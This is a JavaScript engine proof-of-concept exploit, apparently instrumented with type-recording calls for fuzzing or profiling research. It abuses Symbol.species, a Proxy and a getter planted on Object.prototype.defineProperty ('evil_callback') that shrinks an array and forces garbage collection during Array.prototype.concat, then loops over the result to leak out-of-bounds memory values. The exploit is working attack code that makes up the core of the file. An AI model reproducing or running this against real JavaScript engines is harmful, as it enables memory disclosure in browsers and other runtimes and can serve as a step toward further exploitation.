var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
var Inst34 = 0;
var Inst35 = 0;
var Inst36 = 0;
var Inst37 = 0;
var Inst38 = 0;
var Inst39 = 0;
var Inst40 = 0;
var Inst41 = 0;
var Inst42 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
try { if (Inst1 <= 1000 && typeof (Proxy) != "undefined") {_RecordType("<12,17,1>",(Proxy)); Inst1++; } } catch(e) {}
var p = new Proxy([], {});
try { if (Inst0 <= 1000 && typeof (p) != "undefined") {_RecordType("<4,5,1>",(p)); Inst0++; } } catch(e) {}
try { if (Inst3 <= 1000 && typeof (Object.prototype.defineProperty) != "undefined") {_RecordType("<38,69,2>",(Object.prototype.defineProperty)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (Object.prototype) != "undefined") {_RecordType("<38,54,2>",(Object.prototype)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (Object) != "undefined") {_RecordType("<38,44,2>",(Object)); Inst5++; } } catch(e) {}
var b_dp = Object.prototype.defineProperty;
try { if (Inst2 <= 1000 && typeof (b_dp) != "undefined") {_RecordType("<31,35,2>",(b_dp)); Inst2++; } } catch(e) {}

try { if (Inst8 <= 1000 && typeof (Array) != "undefined") {_RecordType("<94,99,4>",(Array)); Inst8++; } } catch(e) {}
class MyArray extends Array {
  static get [Symbol.species]() {
    return function () {
try { if (Inst7 <= 1000 && typeof (p) != "undefined") {_RecordType("<174,175,7>",(p)); Inst7++; } } catch(e) {}
      return p;
    };
  }

}
try { if (Inst6 <= 1000 && typeof (MyArray) != "undefined") {_RecordType("<78,85,4>",(MyArray)); Inst6++; } } catch(e) {}

try { if (Inst10 <= 1000 && typeof (MyArray) != "undefined") {_RecordType("<204,211,13>",(MyArray)); Inst10++; } } catch(e) {}
var w = new MyArray(100);
try { if (Inst9 <= 1000 && typeof (w) != "undefined") {_RecordType("<196,197,13>",(w)); Inst9++; } } catch(e) {}
w[1] = 0.1;
try { if (Inst11 <= 1000 && typeof (w[1]) != "undefined") {_RecordType("<218,222,14>",(w[1])); Inst11++; } } catch(e) {}try { if (Inst12 <= 1000 && typeof (w) != "undefined") {_RecordType("<218,219,14>",(w)); Inst12++; } } catch(e) {}
w[2] = 0.1;
try { if (Inst13 <= 1000 && typeof (w[2]) != "undefined") {_RecordType("<230,234,15>",(w[2])); Inst13++; } } catch(e) {}try { if (Inst14 <= 1000 && typeof (w) != "undefined") {_RecordType("<230,231,15>",(w)); Inst14++; } } catch(e) {}

try { if (Inst15 <= 1000 && typeof (gc) != "undefined") {_RecordType("<252,254,17>",(gc)); Inst15++; } } catch(e) {}
function gc() {
  for (var i = 0; i < 0x100000; ++i) {
try { if (Inst16 <= 1000 && typeof (i) != "undefined") {_RecordType("<270,271,18>",(i)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (i) != "undefined") {_RecordType("<277,278,18>",(i)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (i) != "undefined") {_RecordType("<293,294,18>",(i)); Inst18++; } } catch(e) {}
try { if (Inst20 <= 1000 && typeof (String) != "undefined") {_RecordType("<314,320,19>",(String)); Inst20++; } } catch(e) {}
    var a = new String();
try { if (Inst19 <= 1000 && typeof (a) != "undefined") {_RecordType("<306,307,19>",(a)); Inst19++; } } catch(e) {}
  }
}

try { if (Inst21 <= 1000 && typeof (evil_callback) != "undefined") {_RecordType("<340,353,23>",(evil_callback)); Inst21++; } } catch(e) {}
function evil_callback() {
  w.length = 1; // shorten the array so the backstore pointer is relocated
try { if (Inst22 <= 1000 && typeof (w.length) != "undefined") {_RecordType("<360,368,24>",(w.length)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (w) != "undefined") {_RecordType("<360,361,24>",(w)); Inst23++; } } catch(e) {}

try { if (Inst24 <= 1000 && typeof (gc) != "undefined") {_RecordType("<436,438,26>",(gc)); Inst24++; } } catch(e) {}
  gc(); // force gc to move the array's elements backstore

try { if (Inst25 <= 1000 && typeof (b_dp) != "undefined") {_RecordType("<503,507,28>",(b_dp)); Inst25++; } } catch(e) {}
  return b_dp;
}

try { if (Inst26 <= 1000 && typeof (Object.prototype.__defineGetter__) != "undefined") {_RecordType("<512,545,31>",(Object.prototype.__defineGetter__)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (Object.prototype) != "undefined") {_RecordType("<512,528,31>",(Object.prototype)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (Object) != "undefined") {_RecordType("<512,518,31>",(Object)); Inst28++; } } catch(e) {}try { if (Inst29 <= 1000 && typeof (evil_callback) != "undefined") {_RecordType("<564,577,31>",(evil_callback)); Inst29++; } } catch(e) {}
Object.prototype.__defineGetter__("defineProperty", evil_callback);

try { if (Inst31 <= 1000 && typeof (Array.prototype.concat.call) != "undefined") {_RecordType("<589,616,33>",(Array.prototype.concat.call)); Inst31++; } } catch(e) {}try { if (Inst32 <= 1000 && typeof (Array.prototype.concat) != "undefined") {_RecordType("<589,611,33>",(Array.prototype.concat)); Inst32++; } } catch(e) {}try { if (Inst33 <= 1000 && typeof (Array.prototype) != "undefined") {_RecordType("<589,604,33>",(Array.prototype)); Inst33++; } } catch(e) {}try { if (Inst34 <= 1000 && typeof (Array) != "undefined") {_RecordType("<589,594,33>",(Array)); Inst34++; } } catch(e) {}try { if (Inst35 <= 1000 && typeof (w) != "undefined") {_RecordType("<617,618,33>",(w)); Inst35++; } } catch(e) {}
var c = Array.prototype.concat.call(w);
try { if (Inst30 <= 1000 && typeof (c) != "undefined") {_RecordType("<585,586,33>",(c)); Inst30++; } } catch(e) {}

for (var i = 0; i < 20; i++) {
try { if (Inst36 <= 1000 && typeof (i) != "undefined") {_RecordType("<631,632,35>",(i)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (i) != "undefined") {_RecordType("<638,639,35>",(i)); Inst37++; } } catch(e) {}try { if (Inst38 <= 1000 && typeof (i) != "undefined") {_RecordType("<646,647,35>",(i)); Inst38++; } } catch(e) {}
  // however many values you want to leak
try { if (Inst39 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<697,708,37>",(console.log)); Inst39++; } } catch(e) {}try { if (Inst40 <= 1000 && typeof (console) != "undefined") {_RecordType("<697,704,37>",(console)); Inst40++; } } catch(e) {}try { if (Inst41 <= 1000 && typeof (c[i]) != "undefined") {_RecordType("<709,713,37>",(c[i])); Inst41++; } } catch(e) {}try { if (Inst42 <= 1000 && typeof (c) != "undefined") {_RecordType("<709,710,37>",(c)); Inst42++; } } catch(e) {}
  console.log(c[i]);
}

